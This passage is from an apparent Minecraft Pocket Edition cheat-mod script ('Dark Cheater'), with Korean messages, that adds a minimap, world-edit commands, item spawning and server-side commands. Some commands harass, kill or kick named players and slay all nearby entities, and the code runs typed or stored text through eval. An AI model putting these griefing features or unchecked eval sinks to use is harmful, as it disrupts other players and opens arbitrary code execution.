Dark.showDialog("스크립트 연동 알림", "스크립트 \"테러 도우미\"로부터 연동 신청이 들어왔습니다. 이제부터는 \"서버원 모드\"의 \"테러 도우미\"를 실행하시면, Dark Cheater의 테러 도우미 대신 연동된 테러 도우미가 실행됩니다.");
Dark.save("linkT", true);
file.delete();
}
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/cwepLinkAlert.txt");
if(file.exists()){
Dark.showDialog("스크립트 연동 알림", "스크립트 \"Dark Cheater Addon - Client World Edit Plus\"로부터 연동 신청이 들어왔습니다. 이제부터 \"지형 수정\"의 \"서버원용 월드에딧 GUI\"를 사용하실 수 있습니다.");
file.delete();
}
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/seedLinkAlert.txt");
if(file.exists()){
Dark.showDialog("스크립트 연동 알림", "스크립트 \"Dark Cheater Addon - The Seed\"로부터 연동 신청이 들어왔습니다. 이제부터 \"서버 관련\"의 \"The Seed\"를 사용하실 수 있습니다.");
file.delete();
}
if(dou.seek){
dou.seek2++;
}
if(antiMine[0]!=null){
for(var n in antiMine){
if(Player.isPlayer(antiMine[n]))
Entity.addEffect(antiMine[n], MobEffect.digSlowdown, 10, 9, true, false);
}
}
if(miniMap!=null&&miniMapTime==1){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var mx, my, mz;
mx = Math.round(Player.getX()-0.5);
my = Player.getY()-2;
mz = Math.round(Player.getZ()-0.5);
var mapData = new android.graphics.Bitmap.createBitmap(2*8*10, 2*8*10, android.graphics.Bitmap.Config.ARGB_8888);
var canvas = new android.graphics.Canvas(mapData);
var p = new android.graphics.Paint();
for(var n=-8;n<8+1;n++){
for(var m=-8;m<8+1;m++){
for(var yy=my+2;yy>my-3;yy--){
var b = getTile(mx+n, yy, mz+m);
if(b!=0) break;
}
if(b==0) p.setARGB(0, 0, 0, 0);
else if(b==2||b==253||b==31||b==175||b==37||b==38||b==39||b==40) p.setARGB(255, 0, 255, 45);
else if(b==3||b==243||b==159||b==172||b==60||b==248||b==249) p.setARGB(255, 153, 109, 0);
else if(b==1||(b>=13&&b<=16)||b==4||b==21||b==48||b==82||b==98||b==110||b==129||b==139||b==61||b==62||b==245||b==67||b==71||b==73||b==74||b==109||b==255||b==101) p.setARGB(255, 120, 120, 120);
else if(b==8||b==9||b==22) p.setARGB(255, 0, 0, 255);
else if(b==79||b==174||b==247) p.setARGB(255, 160, 180, 255);
else if(b==5||b==17||b==32||b==47||b==53||b==54||b==58||b==63||b==64||b==65||b==68||b==85||b==107||b==134||b==135||b==136||b==157||b==158||b==162||b==163||b==164||b==183||b==184||b==185||b==186||b==187||b==96) p.setARGB(255, 164, 135, 81);
else if(b==6||b==18||b==81||b==83||b==103||b==104||b==105||b==106||b==111||b==120||b==133||b==141||b==142||b==161||b==244||b==254) p.setARGB(255, 64, 148, 0);
else if(b==10||b==11||b==51||b==26||b==27||b==46||b==152||b==246) p.setARGB(255, 255, 0, 0);
else if(b==12||b==24||b==19||b==41||b==89||b==121||b==170||b==198) p.setARGB(255, 255, 255, 0);
else if(b==86||b==91||b==127) p.setARGB(255, 255, 180, 0);
else if(b==57) p.setARGB(255, 0, 255, 255);
else if(b==87) p.setARGB(255, 150, 0, 0);
else if(b==45) p.setARGB(255, 150, 80, 65);
else if(b==20||b==30||b==35||b==42||b==43||b==44||b==78||b==80||b==92||b==95||b==102||b==126||b==155||b==156||b==171||b==50) p.setARGB(255, 255, 255, 255);
else p.setARGB(255, 0, 0, 0);
canvas.drawRect((n+8)*10, (m+8)*10, (n+8+1)*10, (m+8+1)*10, p);
}}
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 0, 0, 0);
canvas.drawText("●", 8*10, 8*10, p);
var players2 = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players2.push(e);
}
var players = removeDouble(players2);
var px, pz;
for each(var pp in players){
px = Math.abs(mx-Entity.getX(pp));
pz = Math.abs(mz-Entity.getZ(pp));
if(px<=8&&pz<=8&&ad!=pp){
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 255, 255, 255);
canvas.drawText("●", Math.round((mx-Entity.getX(pp))+8)*10, Math.round((mz-Entity.getZ(pp))+8)*10, p);
}
}
var back = new android.graphics.drawable.BitmapDrawable(mapData);
miniMapData.setBackgroundDrawable(back);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
miniMapTime = 11;
}
if(miniMapTime>0){
miniMapTime--;
}
if(showPlayerHealth){
for(var n=0;n<pls.length;n++){
var pp = pls[n];
if(Player.isPlayer(pp)){
var pn = Player.getName(pp).split(" (");
Entity.setNameTag(pp, pn[0]+" ("+Entity.getHealth(pp)+")");
}
}
}
for(var n=0;n<pls.length;n++){
if(!Player.isPlayer(pls[n])){
serverLog += "[서버 접속 해제] 닉네임 : "+pls2[n]+", 시간 : "+Dark.getTime()+"\n";
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+pls2[n]+"(이)가 서버에서 나감\n";
pls.splice(n, 1);
pls2.splice(n, 1);
}
}
for(var n in antiMove){
if(Player.isPlayer(antiMove[n])){
Entity.addEffect(antiMove[n], MobEffect.movementSlowdown, 20, 99, true, false);
Entity.addEffect(antiMove[n], MobEffect.jump, 20, -99, true, false);
}
}
if(menuD!=null){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
dpt.setText(" 현재 포인트 : "+dp.p);
}
}));
}
if(dpwt!=null){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
dpwt.setText(" DP : "+dp.p);
}
}));
}

}


function modSecond(tf){
if(tf){
if(showMobHealth){
var names = ["닭", "소", "돼지", "양", "늑대", "NPC", "버섯소", "오징어", "토끼", "박쥐", "아이언 골램", "스노우 골램", "오셸롯", "좀비", "크리퍼", "스켈레톤", "거미", "좀비 피그맨", "슬라임", "엔더맨", "좀벌레", "동굴 거미", "가스트", "마그마 큐브", "블레이즈", "좀비 NPC", "마녀"];
var entityIds = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45];
for each(var e in Entity.getAll()){
var entityId = Entity.getEntityTypeId(e);
if(entityId<64&&!Player.isPlayer(e)){
if(mcpev3) Entity.setNameTag(e, names[entityIds.indexOf(entityId)]+" ("+Entity.getHealth(e)+"/"+Entity.getMaxHealth(e)+")");
else Entity.setNameTag(e, names[entityIds.indexOf(entityId)]+" ("+Entity.getHealth(e)+")");
}
}
}
if(gh[6]){
var p2x, p2y, p2z;
for each(var e in Entity.getAll()){
p2x = Math.abs(Player.getX()-Entity.getX(e));
p2y = Math.abs(Player.getY()+-Entity.getY(e));
p2z = Math.abs(Player.getZ()-Entity.getZ(e));
if(p2x<=9&&p2y<=9&&p2z<=9&&Player.getEntity()!=e)
Entity.setHealth(e, 0);
}
}
if(dp.t>0){
dp.t--;
}
if(dp.t==0){
dp.p++;
new java.lang.Thread({
run : function(){
Dark.save("point", dp.p);
}
}).start();
dp.t = 10;
}
}
if(dp.p>100) dp.p = 100;

}


function procCmd(cmd){
var Data = cmd.split(" ");
var Data2 = cmd.split("  ");
if(w.tf){
if(Data[0]=="set"){
fixPosData();
setTiles(w.x[2], w.x[3], w.y[2], w.y[3], w.z[2], w.z[3], Data[1], Data[2]);
if(Data[2]==undefined) Dark.toast("블록 아이디가 "+Data[1]+"인 블록으로 채워졌습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록으로 채워졌습니다.");
}
if(Data[0]=="replace"){
fixPosData();
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(getTile(xx, yy, zz)==Data[1])
setTile(xx, yy, zz, Data[2]);
Dark.toast("블록 아이디가 "+Data[1]+"인 블록이 "+Data[2]+"인 블록으로 변경되었습니다.");
}
if(Data[0]=="change"){
fixPosData();
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(getTile(xx, yy, zz)==Data[1]&&Level.getData(xx, yy, zz)==Data[2])
setTile(xx, yy, zz, Data[3], Data[4]);
Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록이, 블록 아이디가 "+Data[3]+", 블록 데미지가 "+Data[4]+"인 블록으로 변경되었습니다.");
}
if(cmd=="no tree"){
fixPosData();
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if((getTile(xx, yy, zz)==17)||(getTile(xx, yy, zz)==18)||(getTile(xx, yy, zz)==161)||(getTile(xx, yy, zz)==162))
setTile(xx, yy, zz, 0);
Dark.toast("나무들이 제거되었습니다.");
}
if(cmd=="snow"){
fixPosData();
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(getTile(xx, yy, zz)!=0&&getTile(xx, yy+1, zz)==0)
setTile(xx, yy+1, zz, 78);
Dark.toast("눈을 내렸습니다.");
}
if(cmd=="freeze"){
fixPosData();
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if((getTile(xx, yy, zz)==8)||(getTile(xx, yy, zz)==9))
setTile(xx, yy, zz, 79);
else if((getTile(xx, yy, zz)==10)||(getTile(xx, yy, zz)==11))
setTile(xx, yy, zz, 49);
else if(getTile(xx, yy, zz)==51)
setTile(xx, yy, zz, 0);
else if((getTile(xx, yy, zz)!=0&&getTile(xx, yy, zz)!=79)&&getTile(xx, yy+1, zz)==0)
setTile(xx, yy+1, zz, 78);
Dark.toast("얼렸습니다.");
}
if(Data[0]=="pillar"){
if(Data[1]=="off"){
w.p2 = false;
Dark.toast("비활성화 되었습니다.");
}
else{
w.p1 = Number(Data[1]);
Dark.toast(Data[1]+"칸으로 설정되었습니다.");
w.p2 = true;
}
}
if(cmd=="no water"){
fixPosData();
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if((getTile(xx, yy, zz)==8)||(getTile(xx, yy, zz)==9))
setTile(xx, yy, zz, 0);
Dark.toast("물이 제거되었습니다.");
}
if(Data[0]=="wall"){
fixPosData();
setTiles(w.x[2], w.x[3], w.y[2], w.y[3], w.z[2], w.z[3], Data[1], Data[2]);
setTiles(w.x[2]+1, w.x[3]-1, w.y[2], w.y[3], w.z[2]+1, w.z[3]-1, 0);
if(Data[2]==undefined) Dark.toast("블록 아이디가 "+Data[1]+"인 블록으로 벽을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록으로 벽을 생성했습니다.");
}
if(Data[0]=="wall2"){
fixPosData();
for(var yy=w.y[2];yy<w.y[3]+1;yy++){
for(var xx=w.x[2];xx<w.x[3]+1;xx++){
setTile(xx, yy, w.z[2], Data[1], Data[2]);
setTile(xx, yy, w.z[3], Data[1], Data[2]);
}
for(var zz=w.z[2];zz<w.z[3]+1;zz++){
setTile(w.x[2], yy, zz, Data[1], Data[2]);
setTile(w.x[3], yy, zz, Data[1], Data[2]);
}
}
if(Data[2]==undefined) Dark.toast("블록 아이디가 "+Data[1]+"인 블록으로 벽을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록으로 벽을 생성했습니다.");
}
if(cmd=="copy"){
fixPosData();
var n = 0, m = 0, o = 0;
var nn = 0;
w.b = [];
w.bd = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++){
w.b[n] = new Array(w.x[3]-w.x[2]);
w.bd[n] = new Array(w.x[3]-w.x[2]);
for(var yy=w.y[2];yy<w.y[3]+1;yy++){
w.b[n][m] = new Array(w.y[3]-w.y[2]);
w.bd[n][m] = new Array(w.y[3]-w.y[2]);
for(var zz=w.z[2];zz<w.z[3]+1;zz++){
w.b[n][m][o] = new Array();
w.bd[n][m][o] = new Array();
w.b[n][m][o] = getTile(xx, yy, zz);
w.bd[n][m][o] = Level.getData(xx, yy, zz);
o++;
nn++;
}
o = 0;
m++;
}
w.yy = m;
m = 0;
n++;
}
Dark.toast(nn+"개의 블록들을 복사했습니다.");
}
if(cmd=="paste"){
var nn = 0;
for(var n=0;n<w.b.length;n++){
for(var m=0;m<w.yy;m++){
for(var o=0;o<w.b[0][0].length;o++){
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, w.b[n][m][o], w.bd[n][m][o]);
nn++;
}}}
Dark.toast(nn+"개의 블록들을 붙여넣었습니다.");
}
if(Data[0]=="circle"){
var wsin, wcos;
for(var n=0;n<360;n++){
wsin = Math.sin(n*Math.PI/72);
wcos = Math.cos(n*Math.PI/72);
setTile(w.x[0]+0.5+Data[1]*wsin, w.y[0], w.z[0]+0.5+Data[1]*wcos, Data[2], Data[3]);
}
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 원을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 원을 생성했습니다.");
}
if(Data[0]=="circle2"){
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
if(Math.pow(n, 2)+Math.pow(m, 2)<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0], w.z[0]+m, Data[2], Data[3]);
}}
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 내부가 차있는 원을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 내부가 차있는 원을 생성했습니다.");
}
if(Data[0]=="cylin"){
var wsin, wcos;
for(var n=0;n<Data[2];n++){
for(var nn=0;nn<360;nn++){
wsin = Math.sin(nn*Math.PI/72);
wcos = Math.cos(nn*Math.PI/72);
setTile(w.x[0]+0.5+Data[1]*wsin, w.y[0]+n, w.z[0]+0.5+Data[1]*wcos, Data[3], Data[4]);
}
}
if(Data[4]==undefined) Dark.toast("블록 아이디가 "+Data[3]+"인 블록으로 원기둥을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[3]+", 블록 데미지가 "+Data[4]+"인 블록으로 원기둥을 생성했습니다.");
}
if(Data[0]=="sphere"){
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
var sph = Math.pow(n, 2)+Math.pow(m, 2)+Math.pow(o, 2);
if(sph>=Math.pow(Number(Data[1])-1, 2)&&sph<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, Data[2], Data[3]);
}}}
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 구를 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 구를 생성했습니다.");
}
if(Data[0]=="sphereh"){
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=0;m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
var sph = Math.pow(n, 2)+Math.pow(m, 2)+Math.pow(o, 2);
if(sph>=Math.pow(Number(Data[1])-1, 2)&&sph<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, Data[2], Data[3]);
}}}
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 반구를 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 반구를 생성했습니다.");
}
if(Data[0]=="sphere2"){
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
if(Math.pow(n, 2)+Math.pow(m, 2)+Math.pow(o, 2)<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, Data[2], Data[3]);
}}}
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 내부가 차있는 구를 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 내부가 차있는 구를 생성했습니다.");
}
if(Data[0]=="line"){
px = Entity.getX(ad);
py = Entity.getY(ad);
pz = Entity.getZ(ad);
yaw = Math.floor(Entity.getYaw(ad));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=1;gun<Number(Data[1])+1;gun++)
setTile(px+gun*sin, py, pz+gun*cos, Data[2], Data[3]);
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 직선을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 직선을 생성했습니다.");
}
if(Data[0]=="line2"){
px = Entity.getX(ad);
py = Entity.getY(ad);
pz = Entity.getZ(ad);
yaw = Math.floor(Entity.getYaw(ad));
pitch = Math.floor(Entity.getPitch(ad));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
tan = -Math.sin(pitch/180*Math.PI);
pcos = Math.cos(pitch/180*Math.PI);
for(var gun=1;gun<Number(Data[1])+1;gun++)
setTile(px+gun*sin*pcos, py+gun*tan, pz+gun*cos*pcos, Data[2], Data[3]);
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 직선을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 직선을 생성했습니다.");
}


}


if(cmd=="dawn"){
Level.setTime(0);
darkMessage("Time set to Dawn");
}
if(cmd=="day"){
Level.setTime(1000);
darkMessage("Time set to Day");
}
if(cmd=="dusk"){
if(mcpev2) Level.setTime(13500);
else Level.setTime(9600);
darkMessage("Time set to Dusk");
}
if(cmd=="night"){
Level.setTime(14000);
darkMessage("Time set to Night");
}
if(Data[0]=="burst"){
if(Data[1]!=null){
darkType = 1;
darkTypeE = Data[1];
darkMessage("Burst Mode on");
}
else if(Data[1]==null){
darkMessage("You should imput burst radius");
}
}
if(cmd=="remove"){
darkType = 2;
darkMessage("Remove Mode on");
}
if(cmd=="mine"){
darkType = 3;
darkMessage("Mine Mode on");
}
if(cmd=="ride"){
darkType = 4;
darkMessage("Ride Mode on");
}
if(Data[0]=="tp"&&Data[3]!=null){
Entity.setPosition(ad, Data[1], Data[2], Data[3]);
darkMessage("Teleported to "+Data[1]+", "+Data[2]+", "+Data[3]+".");
}
if(cmd=="kill"){
darkType = 5;
darkMessage("Kill Mode on");
}
if(cmd=="off"){
darkType = 0;
darkMessage("Darkness off");
}
if(Data[0]=="add"){
if(Data[1]!=null){
if(Data[3]!=null){
addItemInventory(Data[1], Data[2], Data[3]);
if(Data[2]<=1){
darkMessage("Item code "+Data[1]+", item damage "+Data[3]+", amount "+Data[2]+" was given");
}
else if(Data[2]>1){
darkMessage("Item code "+Data[1]+", item damage "+Data[3]+", amount "+Data[2]+" were given");
}
}
if(Data[3]==null){
if(Data[2]==null){
darkMessage("Item code "+Data[1]+", amount 1 was given");
addItemInventory(Data[1], 1, 0);
}
if(Data[2]<=1){
addItemInventory(Data[1], Data[2], 0)
darkMessage("Item code "+Data[1]+", amount "+Data[2]+" was given");
}
else if(Data[2]>1){
addItemInventory(Data[1], Data[2], 0)
darkMessage("Item code "+Data[1]+", amount "+Data[2]+" were given");
}
}
}
else if(Data[1]==null){
darkMessage("You should imput the code, amount, damage about the item");
}
}
if(cmd=="survival"||cmd=="gm 0"){
Level.setGameMode(0);
darkMessage("Gamo Mode 0 (Survival)");
}
if(cmd=="creative"||cmd=="gm 1"){
Level.setGameMode(1);
darkMessage("Gamo Mode 1 (Creative)");
}
if(Data[0]=="give"){
var pp = findHuman(Data2[1]);
Level.dropItem(Entity.getX(pp), Entity.getY(pp), Entity.getZ(pp), 0, Data[1], Data[2], Data[3]);
darkMessage("Items were given to "+Data2[1]+".");
}
if(Data2[0]=="go"){
var pp = findHuman(Data2[1]);
Entity.setPosition(Player.getEntity(), Entity.getX(pp), Entity.getY(pp)+1, Entity.getZ(pp));
darkMessage("Teleported to "+Data2[1]+".");
}
if(Data[0]=="health"){
Entity.setHealth(ad, Data[1]);
darkMessage("Set Health to "+Data[1]+".");
}
if(Data[0]=="time"){
Level.setTime(Data[1]);
darkMessage("Time Set to "+Data[1]+".");
}
if(Data2[0]=="kill"){
var pp = findHuman(Data2[1]);
Entity.setHealth(pp, 0);
darkMessage(Data2[1]+" was killed.");
}
if(Data2[0]=="call"){
var pp = findHuman(Data2[1]);
teleport(pp, Entity.getX(ad), Entity.getY(ad)+1, Entity.getZ(ad));
darkMessage(Data2[1]+" was called.");
}

if(cmd=="hero k"){
h.l = true;
Dark.toast("언어설정(히로빈) - 한국어");
}
if(cmd=="hero e"){
h.l = false;
Dark.toast("Language set(Herobrine) - English");
}
if(scriptOn&&Dark.read("scriptType")==3)
eval(Dark.read("scriptAdded"));
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] 명령어 사용 (/"+cmd+")\n";


}


function darkProcCmd(cmd){
try{
eval(cmd);
}
catch(e){
Dark.showDialog("오류 발생", e.toString());
}

}


function procCmdOp(op, cmd){
var Data = cmd.split(" ");
var Data2 = cmd.split("  ");
var opu = findHuman(op);
var nn = ops.indexOf(opu);
if(cmd==".day"&&opData[nn][0]){
Level.setTime(500);
Dark.toast(op+"(이)가 명령어 .day를 사용하였습니다.");
}
if(cmd==".night"&&opData[nn][1]){
Level.setTime(14000);
Dark.toast(op+"(이)가 명령어 .night를 사용하였습니다.");
}
if(Data[0]==".tp"&&Data[3]!=null&&opData[nn][2]){
teleport(opu, Data[1], Data[2], Data[3]);
Dark.toast(op+"(이)가 명령어 .tp를 사용하였습니다.\n("+Data[1]+", "+Data[2]+", "+Data[3]+")로 이동함.");
}
if(Data[0]==".add"&&opData[nn][3]){
if(Data[1]!=null){
if(Data[3]!=null){
Level.dropItem(Entity.getX(opu), Entity.getY(opu), Entity.getZ(opu), 0, Data[1], Data[2], Data[3]);
Dark.toast(op+"(이)가 명령어 .add를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 "+Data[3]+", 개수 "+Data[2]+")");
}
if(Data[3]==null){
if(Data[2]==null){
Dark.toast(op+"(이)가 명령어 .add를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 0, 개수 1)");
Level.dropItem(Entity.getX(opu), Entity.getY(opu), Entity.getZ(opu), 0, Data[1], 1, 0);
}
else{
Level.dropItem(Entity.getX(opu), Entity.getY(opu), Entity.getZ(opu), 0, Data[1], Data[2], 0)
Dark.toast(op+"(이)가 명령어 .add를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 0, 개수 "+Data[2]+")");
}
}
}
}
if(Data[0]==".give"&&opData[nn][4]){
var pp = findHuman(Data2[1]);
Level.dropItem(Entity.getX(pp), Entity.getY(pp), Entity.getZ(pp), 0, Data[1], Data[2], Data[3]);
Dark.toast(op+"(이)가 명령어 .give를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 "+Data[1]+", 개수 "+Data[2]+", 수신자 : "+Data2[1]+")");
}
if(Data2[0]==".go"&&opData[nn][5]){
var pp = findHuman(Data2[1]);
teleport(Player.getEntity(), Entity.getX(pp), Entity.getY(pp)+1, Entity.getZ(pp));
Dark.toast(op+"(이)가 명령어 .go를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
if(Data[0]==".health"&&opData[nn][6]){
Entity.setHealth(opu, Data[1]);
Dark.toast(op+"(이)가 명령어 .health를 사용하였습니다.\n(체력 : "+Data[1]+")");
}
if(Data2[0]==".kill"&&opData[nn][7]){
var pp = findHuman(Data2[1]);
if(ad!=pp){
Entity.setHealth(pp, 0);
Dark.toast(op+"(이)가 명령어 .kill를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
else{
Dark.toast(op+"(이)가 명령어 .kill로 서버장 사살을 시도하였습니다.");
}
}
if(Data2[0]==".call"&&opData[nn][8]){
var pp = findHuman(Data2[1]);
teleport(pp, Entity.getX(opu), Entity.getY(opu)+1, Entity.getZ(opu));
Dark.toast(op+"(이)가 명령어 .call를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
if(Data[0]==".heal"&&opData[nn][9]){
var pp = findHuman(Data2[1]);
Entity.setHealth(opu, 20);
Dark.toast(op+"(이)가 명령어 .heal를 사용하였습니다.\n(타겟 : "+Data[1]+")");
}
if(Data2[0]==".kick"&&opData[nn][10]){
var pp = findHuman(Data2[1]);
if(ad!=pp){
Entity.remove(pp);
Dark.toast(op+"(이)가 명령어 .kick를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
else{
Dark.toast(op+"(이)가 명령어 .kick으로 서버장 추방을 시도하였습니다.");
}
}


}


function procCmdWE(user, cmd){
var Data = cmd.split(" ");
var x1, y1, z1, x2, y2, z2;
var n = wo.user.indexOf(user);
x1 = Math.min(wo.x1[n], wo.x2[n]);
y1 = Math.min(wo.y1[n], wo.y2[n]);
z1 = Math.min(wo.z1[n], wo.z2[n]);
x2 = Math.max(wo.x1[n], wo.x2[n]);
y2 = Math.max(wo.y1[n], wo.y2[n]);
z2 = Math.max(wo.z1[n], wo.z2[n]);
if(Data[0]==".set"){
setTiles(x1, x2, y1, y2, z1, z2, Data[1], Data[2]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".replace"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)==Data[1])
setTile(xx, yy, zz, Data[2]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".change"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)==Data[1]&&Level.getData(xx, yy, zz)==Data[2])
setTile(xx, yy, zz, Data[3], Data[4]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(cmd==".no tree"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if((getTile(xx, yy, zz)==17)||(getTile(xx, yy, zz)==18)||(getTile(xx, yy, zz)==161)||(getTile(xx, yy, zz)==162))
setTile(xx, yy, zz, 0);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(cmd==".snow"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)!=0&&getTile(xx, yy+1, zz)==0)
setTile(xx, yy+1, zz, 78);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(cmd==".no water"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if((getTile(xx, yy, zz)==8)||(getTile(xx, yy, zz)==9))
setTile(xx, yy, zz, 0);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".circle"){
var wsin, wcos;
for(var nn=0;nn<360;nn++){
wsin = Math.sin(nn*Math.PI/36);
wcos = Math.cos(nn*Math.PI/36);
setTile(wo.x1[n]+0.5+Data[1]*wsin, wo.y1[n], wo.z1[n]+0.5+Data[1]*wcos, Data[2], Data[3]);
}
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".cylin"){
var wsin, wcos;
for(var nn=0;nn<Data[2];nn++){
for(var mm=0;mm<360;mm++){
